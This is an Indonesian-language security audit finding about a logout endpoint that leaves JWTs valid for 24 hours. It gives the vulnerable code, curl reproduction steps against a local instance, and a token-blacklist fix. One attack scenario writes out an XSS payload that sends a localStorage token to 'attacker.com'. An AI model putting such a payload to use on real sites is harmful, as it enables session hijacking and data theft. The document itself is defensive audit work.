# HIGH-002 — Logout Tidak Invalidate JWT (Tidak Ada Token Blacklist)

![Severity](https://img.shields.io/badge/Severity-HIGH-red)
![Module](https://img.shields.io/badge/Module-Authentication-orange)
![Status](https://img.shields.io/badge/Status-Open-critical)

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Technical Analysis](#technical-analysis)
3. [Business Impact](#business-impact)
4. [Real Use Case Scenario](#real-use-case-scenario)
5. [Root Cause Analysis](#root-cause-analysis)
6. [Evidence / Code Reference](#evidence--code-reference)
7. [Reproduction / Testing Steps](#reproduction--testing-steps)
8. [Risk Assessment](#risk-assessment)
9. [Recommended Fix](#recommended-fix)
10. [Refactor Recommendation](#refactor-recommendation)
11. [Long-Term Improvement Recommendation](#long-term-improvement-recommendation)

---

## Executive Summary

Saat user melakukan **logout**, endpoint `/auth/logout` hanya mengembalikan URL logout Azure AD — **tidak ada proses di sisi backend untuk membatalkan token JWT internal yang sudah diterbitkan**. Ini berarti token JWT yang dimiliki user tetap valid selama 24 jam penuh setelah logout, selama masa berlakunya belum habis.

Dampak paling kritis: jika token user dicuri (via XSS, network sniffing, dsb), **tidak ada cara untuk merevoke akses tersebut** — attacker tetap memiliki akses penuh selama 24 jam.

---

## Technical Analysis

### Endpoint Logout (Tidak Melakukan Apa-apa di Backend)

```python
# app/api/v1/auth.py
@router.post("/logout")
async def logout(request: Request, redirect_uri: str = Query(None)):
    redirect_url = redirect_uri or urllib.parse.quote(str(request.base_url))

    logout_url = (
        f"https://login.microsoftonline.com/{settings.azure_tenant_id}/oauth2/v2.0/logout"
        f"?post_logout_redirect_uri={redirect_url}"
    )

    return {"logout_url": logout_url}
    # ← TIDAK ada: token blacklist, session invalidation, atau apapun
```

### Validasi Token (Tidak Cek Blacklist)

```python
# app/core/security.py
async def _load_user_from_jwt(token: Optional[str], db: Session | None = None):
    ...
    try:
        payload = jwt.decode(
            token, settings.jwt_secret_key, algorithms=[settings.jwt_algorithm]
        )
        # ← TIDAK ada: cek apakah token ini sudah di-blacklist
        sub: str = payload.get("sub")
        token_data = TokenData(sub=sub)
    except JWTError:
        raise credentials_exception
    ...
```

### Token Expiry 24 Jam

```python
# app/core/config.py
jwt_access_token_expire_minutes: int = Field(
    default=60 * 24,  # ← 1440 menit = 24 jam
    alias="JWT_ACCESS_TOKEN_EXPIRE_MINUTES"
)
```

**Dengan masa berlaku 24 jam dan tidak ada blacklist**: sebuah token yang bocor memberikan akses penuh selama 24 jam, tidak peduli apakah user sudah logout.

---

## Business Impact

| Dampak                                  | Deskripsi                                                                                                           |
| --------------------------------------- | ------------------------------------------------------------------------------------------------------------------- |
| **Security breach tidak dapat di-stop** | Jika token dicuri, tidak ada cara untuk menghentikan akses attacker sampai token expire                             |
| **Compliance risk**                     | Sistem yang menyimpan data sensitif (invoice, kontrak) harus mampu merevoke akses kapan saja                        |
| **Akses user yang di-nonaktifkan**      | Admin menonaktifkan user di sistem, namun user tersebut masih bisa akses API selama 24 jam dengan token lama        |
| **Audit trail tidak valid**             | Request yang muncul setelah logout tidak bisa dibedakan apakah itu user yang sama atau attacker dengan token curian |
| **Tidak memenuhi best practice**        | OWASP A07: Identification and Authentication Failures — token revocation adalah requirement keamanan standar        |

---

## Real Use Case Scenario

### Skenario 1: Token Dicuri via XSS

```
1. User A login → menerima JWT token, disimpan di localStorage (lihat HIGH-003)
2. Halaman web memiliki celah XSS (injeksi script)
3. Attacker menyuntikkan script: document.location='attacker.com?t='+localStorage.token
4. User A menyadari sesuatu tidak beres → logout dari aplikasi
5. Backend menerima /auth/logout → hanya return logout_url Azure, tidak invalidate JWT
6. Attacker sudah memiliki token yang masih valid 23 jam lebih
7. Attacker menggunakan token untuk mengakses: invoice data, kontrak SCD, data finansial
8. Sistem tidak bisa menghentikan akses ini
```

### Skenario 2: Admin Menonaktifkan User

```
1. Karyawan X mengundurkan diri → HR meminta admin menonaktifkan akun
2. Admin meng-update User.is_active = False di database
3. Karyawan X sudah login 2 jam yang lalu, memiliki token valid 22 jam lagi
4. Karyawan X masih bisa mengakses semua endpoint API dengan token lamanya
5. get_current_user() tidak re-check is_active dari DB setiap request — hanya dari JWT payload
```

> **Catatan:** `_load_user_from_jwt()` memang memanggil `_fetch_user_from_db()` yang cek `is_active`, namun ini hanya terjadi setiap request via DB query — jika query ini di-optimize via cache di masa depan, celah ini semakin terbuka.

### Skenario 3: Shared Computer

```
1. User B login di komputer kantor yang dipakai bersama
2. User B logout karena harus meninggalkan meja
3. Kolega menggunakan komputer yang sama
4. Token masih ada di localStorage (lihat HIGH-003) dan masih valid
5. Kolega bisa mengakses data User B
```

---

## Root Cause Analysis

**Tipe masalah:** Missing security control — tidak ada token revocation mechanism

**Akar masalah:**

1. Logout endpoint hanya melakukan client-side Azure logout (redirect URL), tidak ada server-side action
2. JWT dirancang sebagai **stateless** — tidak ada built-in revocation. Untuk mendukung revocation, diperlukan state tambahan (blacklist)
3. Tidak ada `jti` (JWT ID) claim di token, sehingga tidak bisa di-track per-token
4. Token expiry 24 jam terlalu panjang untuk aplikasi enterprise dengan data sensitif

---

## Evidence / Code Reference

| Item        | Detail                                                             |
| ----------- | ------------------------------------------------------------------ |
| **File**    | `app/api/v1/auth.py` — `logout()` function                         |
| **File**    | `app/core/security.py` — `_load_user_from_jwt()` function          |
| **File**    | `app/core/config.py` — `jwt_access_token_expire_minutes = 60 * 24` |
| **Missing** | Tidak ada tabel token blacklist                                    |
| **Missing** | Tidak ada `jti` claim di token                                     |

---

## Reproduction / Testing Steps

### Pre-condition

- Aplikasi berjalan
- `JWT_AUTH_ENABLED=true` di environment

### Langkah Reproduksi

```bash
# Step 1: Login dan dapatkan token
TOKEN=$(curl -s -X POST "http://localhost:8000/api/v1/auth/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=user@kpc.co.id&password=your_password" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

echo "Token: $TOKEN"

# Step 2: Verifikasi token valid
curl -X GET "http://localhost:8000/api/v1/activity-logs" \
  -H "Authorization: Bearer $TOKEN"
# Expected: 200 OK dengan data

# Step 3: Logout
curl -X POST "http://localhost:8000/api/v1/auth/logout" \
  -H "Authorization: Bearer $TOKEN"
# Expected: {"logout_url": "..."}

# Step 4: Gunakan token yang sama setelah logout
curl -X GET "http://localhost:8000/api/v1/activity-logs" \
  -H "Authorization: Bearer $TOKEN"
# Expected (seharusnya): HTTP 401 Unauthorized
# Actual (masalah):      HTTP 200 OK — token MASIH berlaku!
```

### Verifikasi JWT Payload

```bash
# Decode payload token tanpa verifikasi (base64)
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
# Lihat field "exp" — akan terlihat masa berlaku 24 jam dari sekarang
```

---

## Risk Assessment

| Aspek                         | Nilai                                                                  |
| ----------------------------- | ---------------------------------------------------------------------- |
| **Severity**                  | HIGH                                                                   |
| **Urgency**                   | HIGH                                                                   |
| **Likelihood**                | MEDIUM-HIGH — bergantung pada seberapa aman storage token di frontend  |
| **Impact if not fixed**       | Token yang bocor/dicuri tidak bisa direvoke selama 24 jam              |
| **Estimated Fix Complexity**  | MEDIUM — membutuhkan tabel DB + perubahan di logout + get_current_user |
| **Estimated Production Risk** | HIGH — compliance dan security risk                                    |

---

## Recommended Fix

### Opsi 1: Database Token Blacklist (Recommended)

**Buat tabel `auth.revoked_tokens`:**

```sql
CREATE TABLE auth.revoked_tokens (
    jti        VARCHAR(64)  PRIMARY KEY,
    user_email VARCHAR(255) NOT NULL,
    revoked_at TIMESTAMPTZ  NOT NULL DEFAULT NOW(),
    expires_at TIMESTAMPTZ  NOT NULL  -- salin dari token exp
);

CREATE INDEX idx_revoked_tokens_expires_at ON auth.revoked_tokens(expires_at);
```

**Tambahkan `jti` ke token saat dibuat:**

```python
# app/core/security.py
import uuid

def create_access_token(data: dict, expires_delta: Optional[timedelta] = None) -> str:
    to_encode = data.copy()
    expire = datetime.now(timezone.utc) + (
        expires_delta or timedelta(minutes=settings.jwt_access_token_expire_minutes)
    )
    jti = str(uuid.uuid4())  # Unique token ID
    to_encode.update({"exp": expire, "jti": jti})
    return jwt.encode(to_encode, settings.jwt_secret_key, algorithm=settings.jwt_algorithm)
```

**Update logout untuk blacklist token:**

```python
@router.post("/logout")
async def logout(
    request: Request,
    redirect_uri: str = Query(None),
    token: Optional[str] = Depends(oauth2_scheme),
    session: Session = Depends(get_db),
):
    if token:
        try:
            payload = jwt.decode(
                token, settings.jwt_secret_key, algorithms=[settings.jwt_algorithm]
            )
            jti = payload.get("jti")
            exp = payload.get("exp")
            sub = payload.get("sub")
            if jti and exp:
                revoked = RevokedToken(
                    jti=jti,
                    user_email=sub or "",
                    expires_at=datetime.fromtimestamp(exp, tz=timezone.utc),
                )
                session.add(revoked)
                session.commit()
        except JWTError:
            pass  # Token sudah invalid, tidak perlu di-blacklist

    redirect_url = redirect_uri or urllib.parse.quote(str(request.base_url))
    logout_url = (
        f"https://login.microsoftonline.com/{settings.azure_tenant_id}/oauth2/v2.0/logout"
        f"?post_logout_redirect_uri={redirect_url}"
    )
    return {"logout_url": logout_url}
```

**Tambahkan blacklist check di `_load_user_from_jwt()`:**

```python
async def _load_user_from_jwt(token: Optional[str], db: Session | None = None):
    ...
    payload = jwt.decode(token, settings.jwt_secret_key, algorithms=[settings.jwt_algorithm])
    jti = payload.get("jti")

    # Cek blacklist
    if jti:
        with session_scope() as check_session:
            is_revoked = check_session.exec(
                select(RevokedToken).where(RevokedToken.jti == jti)
            ).first()
            if is_revoked:
                raise credentials_exception
    ...
```

### Opsi 2: Kurangi Token Expiry

Sebagai mitigasi sementara (tidak cukup sebagai solusi permanen), kurangi masa berlaku token:

```python
# config.py — kurangi dari 24 jam ke 2 jam
jwt_access_token_expire_minutes: int = Field(
    default=60 * 2,  # 2 jam, bukan 24 jam
    alias="JWT_ACCESS_TOKEN_EXPIRE_MINUTES"
)
```

---

## Refactor Recommendation

1. Tambahkan cleanup job untuk expired revoked tokens (Celery Beat task harian)
2. Implementasi **refresh token** dengan masa berlaku pendek (15 menit access token, 7 hari refresh token)
3. Pisahkan token revocation logic ke `TokenService` tersendiri
4. Expose endpoint `GET /auth/sessions` untuk user melihat sesi aktif

---

## Long-Term Improvement Recommendation

1. **Redis untuk blacklist** — Gunakan `redis.setex(jti, ttl_seconds, "revoked")` untuk performa lebih baik dari DB query setiap request
2. **Short-lived access tokens** — 15 menit access token + refresh token adalah industri standard
3. **Device/session management** — Track per-device tokens agar user bisa selectively logout dari satu device
4. **Audit** — Log setiap token revocation event ke `UserActivityLog`

---

_Related Finding: HIGH-003 (JWT Stored in localStorage), MEDIUM-010 (Auth Events Not Logged)_
_Related API: `POST /api/v1/auth/logout`, `POST /api/v1/auth/token`_
_Related Table: (akan dibuat) `auth.revoked_tokens`_
